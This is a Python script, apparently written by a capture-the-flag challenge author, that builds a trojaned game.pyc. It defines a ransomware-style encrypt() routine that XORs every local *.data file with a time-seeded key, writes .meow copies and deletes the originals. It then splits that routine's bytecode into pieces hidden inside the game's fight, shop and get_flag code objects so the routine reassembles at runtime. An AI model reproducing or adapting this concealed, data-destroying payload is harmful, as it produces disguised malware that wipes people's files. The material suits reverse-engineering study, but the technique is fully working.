import random
import marshal
from bytecode import ConcreteInstr, ConcreteBytecode # pip install bytecode
import dis
import importlib
from struct import pack
import time


def encrypt():
    print("""
[REVENGE OF CATS]

 ██▀███  ▓█████ ██▒   █▓▓█████  ███▄    █   ▄████ ▓█████     ▒█████    █████▒    ▄████▄   ▄▄▄     ▄▄▄█████▓  ██████ 
▓██ ▒ ██▒▓█   ▀▓██░   █▒▓█   ▀  ██ ▀█   █  ██▒ ▀█▒▓█   ▀    ▒██▒  ██▒▓██   ▒    ▒██▀ ▀█  ▒████▄   ▓  ██▒ ▓▒▒██    ▒ 
▓██ ░▄█ ▒▒███   ▓██  █▒░▒███   ▓██  ▀█ ██▒▒██░▄▄▄░▒███      ▒██░  ██▒▒████ ░    ▒▓█    ▄ ▒██  ▀█▄ ▒ ▓██░ ▒░░ ▓██▄   
▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄    ▒██   ██░░▓█▒  ░    ▒▓▓▄ ▄██▒░██▄▄▄▄██░ ▓██▓ ░   ▒   ██▒
░██▓ ▒██▒░▒████▒  ▒▀█░  ░▒████▒▒██░   ▓██░░▒▓███▀▒░▒████▒   ░ ████▓▒░░▒█░       ▒ ▓███▀ ░ ▓█   ▓██▒ ▒██▒ ░ ▒██████▒▒
░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░   ░ ▒░▒░▒░  ▒ ░       ░ ░▒ ▒  ░ ▒▒   ▓▒█░ ▒ ░░   ▒ ▒▓▒ ▒ ░
  ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ░ ░  ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░     ░ ▒ ▒░  ░           ░  ▒     ▒   ▒▒ ░   ░    ░ ░▒  ░ ░
  ░░   ░    ░       ░░     ░      ░   ░ ░ ░ ░   ░    ░      ░ ░ ░ ▒   ░ ░       ░          ░   ▒    ░      ░  ░  ░  
   ░        ░  ░     ░     ░  ░         ░       ░    ░  ░       ░ ░             ░ ░            ░  ░              ░  
                    ░                                                           ░                                   
""")
    random.seed(int(time.time()))
    for f in __import__("glob").glob("*.data"):
        print("[+] Encrypting:", f)
        n = 8
        enc = open(f+".meow", 'wb')
        for c in open(f, 'rb').read():
            key = random.randint(22, 222) + (n * 3 - 5) % 22
            enc.write(bytes([c ^ key]))
            n += 3
        __import__('os').unlink(f)
    print("Meow!\nHP = 222")
    time.sleep(0.5)
    print("HP = 22")
    time.sleep(0.5)
    print("HP = 2")
    time.sleep(0.5)
    print("HP = 0\nMeow, You Died \|/.")
    exit()


pyc = open("__pycache__/source.cpython-38.pyc", 'rb')
_magic = pyc.read(16).hex()
pyc_bytes = pyc.read()
code = marshal.loads(pyc_bytes)
bc = ConcreteBytecode.from_code(code)

print(bc.consts)

# [fight]
# need to call `get_flag` when unpacking bytecode
fight_code = ConcreteBytecode.from_code(bc.consts[12])
fight_code.names += ["\x00", "get_flag"]
_get_flag_i = fight_code.names.index('get_flag')

# ----- ransomware start -----

PART_SIZE = 12  # split original code into n parts with PART_SIZE length
orig_code = ConcreteBytecode.from_code(encrypt.__code__)

FIRST_WRITE_SIZE = 18
JUMP_SIZE = 6
unpacked_idx = FIRST_WRITE_SIZE  # continue after first write

jmp_abs = []
for_iter = []
orig_to_unpacked = {}  # mapping

_arg_code = None
part_code = None

code_pos = []
first_code = b''
for base in range(0, len(orig_code), PART_SIZE):
    # print(unpacked_idx)
    part_code = b''
    for i in range(base, min(base+PART_SIZE, len(orig_code))):
        instr = orig_code[i]

        if instr.name in ["LOAD_GLOBAL", "LOAD_METHOD"]:
            fight_code.names.append(orig_code.names[instr.arg])
            instr.arg = len(fight_code.names) - 1
        elif instr.name == "LOAD_CONST":
            fight_code.consts.append(orig_code.consts[instr.arg])
            instr.arg = len(fight_code.consts) - 1
        elif instr.name == "JUMP_ABSOLUTE":
            print('JUMP_ABSOLUTE')
            jmp_abs.append(unpacked_idx)
        elif instr.name == "FOR_ITER":
            print('FOR_ITER')
            for_iter.append(unpacked_idx)
            instr.arg += i * 2  # [TEMP]: store absolute pos

        part_code += instr.assemble()

        orig_to_unpacked[i] = unpacked_idx
        unpacked_idx += 1

    unpacked_idx += 7 + JUMP_SIZE  # size of calling write function
    _arg_offset = len(fight_code.consts)
    _arg_code = len(fight_code.consts) + 1
    part_code += bytes([
        dis.opmap['LOAD_GLOBAL'], _get_flag_i,
        dis.opmap['LOAD_CONST'], _arg_offset,  # v
        dis.opmap['LOAD_CONST'], _arg_code,  # x
        dis.opmap['CALL_FUNCTION'], 2,
        dis.opmap['POP_TOP'], 0,
    ])

    if 2*(unpacked_idx) <= 0xff:
        part_code += bytes([
            dis.opmap['NOP'], 0,
            dis.opmap['JUMP_ABSOLUTE'], 2*unpacked_idx
        ])
    else:
        part_code += bytes([
            dis.opmap['EXTENDED_ARG'], 1,
            dis.opmap['JUMP_ABSOLUTE'], (2*unpacked_idx) % 256,
        ])

    print(2*base, 2*unpacked_idx, part_code)

    fight_code.consts += [2*unpacked_idx, b'']  # (offset, data)
    if code_pos:
        fight_code.consts[code_pos[-1]] = part_code
    else:
        first_code = part_code
    code_pos.append(_arg_code)


if _arg_code != None:  # for last one
    fight_code.consts[_arg_code] = part_code

print(code_pos)

# fixing JUMP_ABSOLUTE target
# BUG: need EXTENDED_ARG when `target` > 0xff
for offset in jmp_abs:
    nth_part = (offset - FIRST_WRITE_SIZE) // (PART_SIZE+7+JUMP_SIZE) - 1
    _offset = (offset - FIRST_WRITE_SIZE) % (PART_SIZE+7+JUMP_SIZE)
    print(nth_part, _offset)
    pos = code_pos[nth_part]
    code_part = fight_code.consts[pos]
    op_code, target = code_part[_offset*2:_offset*2+2]
    assert(op_code == dis.opmap['JUMP_ABSOLUTE'])
    dis.dis(bytes([op_code, target]))
    fight_code.consts[pos] = code_part[:_offset*2+1] + \
        bytes([orig_to_unpacked[target/2]*2]) + code_part[_offset*2+2:]

# fixing FOR_ITER delta
# BUG: need EXTENDED_ARG when `delta` > 0xff
for offset in for_iter:
    nth_part = (offset - FIRST_WRITE_SIZE) // (PART_SIZE+7+JUMP_SIZE) - 1
    _offset = (offset - FIRST_WRITE_SIZE) % (PART_SIZE+7+JUMP_SIZE)
    print(nth_part, _offset)
    pos = code_pos[nth_part]
    code_part = fight_code.consts[pos]
    op_code, target = code_part[_offset*2:_offset*2+2]
    assert(op_code == dis.opmap['FOR_ITER'])
    delta = orig_to_unpacked[target/2]*2 - offset*2
    dis.dis(bytes([op_code, target]))
    fight_code.consts[pos] = code_part[:_offset*2+1] + bytes([delta]) + code_part[_offset*2+2:]
    # dis.dis(fight_code.consts[pos])

# the start of everything :)
fight_code.consts += [FIRST_WRITE_SIZE*2, first_code]
FIRST_WRITE = bytes([
    dis.opmap['LOAD_GLOBAL'], _get_flag_i,
    dis.opmap['LOAD_CONST'], len(fight_code.consts) - 2,
    dis.opmap['LOAD_CONST'], len(fight_code.consts) - 1,
    dis.opmap['CALL_FUNCTION'], 2,
    dis.opmap['POP_TOP'], 0,
    dis.opmap['JUMP_ABSOLUTE'], FIRST_WRITE_SIZE*2,
])
print("FIRST_WRITE =", FIRST_WRITE)


# ----- ransomware end -----

# [fight] store back
bc.consts[12] = fight_code.to_code()


# [shop]
# need to call `fight` when ransomware init
shop_code = ConcreteBytecode.from_code(bc.consts[14])
shop_code.names += ["\x00", "fight"]
shop_code.consts.append(-22222)
bc.consts[14] = shop_code.to_code()

get_flag_code = ConcreteBytecode.from_code(bc.consts[8])
get_flag_code.name = '''
get_flag():
    global token
    if token != 'd656d6f266c65637f236f62707f2':
        return
    magic = [144, 26, 151, 181, 29, 139, 19, 120, 165, 123, 179, 104, 80, 143]
    fl4g = bytes([i ^ j for i, j in zip(magic, bytes.fromhex(token))])
    print('🐱 FLAG =', fl4g)


def save_game
'''.strip()
get_flag_code.consts[get_flag_code.consts.index(b"[FIRST_WRITE_DATA]")] = FIRST_WRITE
bc.consts[8] = get_flag_code.to_code()


# Dump *.pyc
with open("game.pyc", 'wb') as f:
    magic = importlib.util.MAGIC_NUMBER + pack('I', 0) + pack("I", int(time.time())) + pack("I", 1)
    f.write(magic)
    code_bytes = marshal.dumps(bc.to_code())
    f.write(code_bytes)


